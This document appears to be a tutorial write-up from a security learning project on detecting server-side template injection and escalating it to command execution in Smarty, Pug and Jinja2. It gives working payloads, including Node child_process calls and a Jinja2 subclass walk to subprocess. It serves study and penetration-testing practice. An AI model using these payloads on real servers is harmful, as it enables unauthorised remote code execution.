![project ssti](identification.png)

## Identifying Server-Side Template Injection (SSTI)

SSTI can be identified by injecting simple template expressions and observing how the server processes them. A common first test is an arithmetic expression like *${7*7}* or *{{7*7}}*.
Follow the green lines if the payload worked or follow red line.
If the response evaluates to 49, template execution is likely occurring.

If the expression is rendered as plain text, the input is probably not vulnerable.

Further payloads using template-specific syntax (such as comments {* *}, string operations, or function calls) help narrow down the template engine (e.g., Smarty, Jinja2, Twig).
The image above illustrates a step-by-step decision flow to detect SSTI and identify the underlying template engine.


## PHP - Smarty

After confirming that the payload *${7*7}* is evaluated (returns 49), we can attempt template-specific payloads to identify the engine and confirm exploitation.

Smarty supports modifiers, such as upper:
```
{'Hello'|upper}
```
If the output is returned in uppercase (HELLO), this strongly indicates Smarty.

To further confirm and demonstrate impact, we can attempt command execution using the system function:
```
{system("id")}
```
If this returns system user information, it clearly confirms Smarty SSTI with command execution capability.

## Node.js – Pug (Jade)

Server-Side Template Injection (SSTI) in Pug can be identified by testing JavaScript interpolation.
A common detection payload is:
```
#{7*7}

```
If the expression is evaluated and returns 49, it indicates that Pug (formerly Jade) is in use, as Pug allows direct JavaScript execution inside #{}.

## Command Execution

Since Pug templates execute JavaScript, we can leverage Node.js internals to execute system commands.
A basic payload to list files is:
```
#{root.process.mainModule.require('child_process').spawnSync('ls').stdout}

```
If this returns output, command execution is confirmed.
```
## Why spawnSync('ls -lah') Does Not Work
```
Using:

spawnSync('ls -lah')

does not work as expected because spawnSync does not split a single string into a command and its arguments. Instead, it treats the entire string as the command name, which causes execution to fail.

## The correct function signature is:
```
spawnSync(command, [args], [options])
```

command: the executable to run (string)

args: an array of arguments

options: optional execution settings

## Correct Payload with Arguments

To properly execute ls -lah, the command and arguments must be separated:
```
#{root.process.mainModule.require('child_process').spawnSync('ls', ['-lah']).stdout}

```
If successful, this confirms Pug SSTI leading to arbitrary command execution.

## jinja2
Inject a basic Jinja2 syntax like {{7*7}} to check for template processing. If the application returns 49, it indicates that Jinja2 is processing the template.

Output is 49 using the above payload

Once Jinja2's use is confirmed, we can the use the payload 
```
{{"".__class__.__mro__[1].__subclasses__()[<index-of-subprocess.Popen>].__repr__.__globals__.get("__builtins__").get("__import__")("subprocess").check_output("ls")}}
```
A common technique is to enumerate all subclasses of object to locate classes related to process execution (such as subprocess.Popen).

Enumerating subclasses
```
{{ "". __class__.__mro__[1].__subclasses__() }}
```
### Explanation:

"" → creates a string object

.__class__ → <class 'str'>

.__mro__ → method resolution order ([str, object])

.__mro__[1] → <class 'object'>

.__subclasses__() → returns all loaded subclasses of object

This output is a list containing many internal Python classes, including those related to process execution, such as *subprocess.Popen*.

### Finding the index of subprocess.Popen

Since __subclasses__() returns a list, each class has an index.
You must identify the index of subprocess.Popen manually from the output.

Example (index will vary by environment):
```
{{ "". __class__.__mro__[1].__subclasses__()[396] }}
```
## Why check_output('ls -lah') Does Not Work
When you use check_output('ls -lah'), you're passing the entire command and its arguments as a single string. This is not the recommended way to use check_output because it does not parse the string into a command and separate arguments. Instead, it treats the whole string as a single command to execute, which it cannot resolve as a valid executable and thus fails to run.

This method of passing arguments can potentially lead to shell injection vulnerabilities if user-controlled strings are concatenated directly into the command string. By requiring commands and their arguments to be passed as a list, check_output minimizes this risk.

```
subprocess.check_output([command, arg1, arg2])
```
command: A string that specifies the command to execute.
arg1, arg2, ...: Additional arguments that should be passed to the command.

## Correct Usage of check_output
To properly execute the ls command with options using check_output, you should pass the command and its arguments as separate elements in a list:
```
subprocess.check_output(['ls', '-lah'])
```
The list ['ls', '-lah'] contains the command ls and its argument -lah. The command is clearly separated from its arguments, which ensures that each part is correctly handled as intended. So the final payload will then be 
```
{{"".__class__.__mro__[1].__subclasses__()[<index-of-subprocess.popen>].__repr__.__globals__.get("__builtins__").get("__import__")("subprocess").check_output(['ls', '-lah'])}}
```
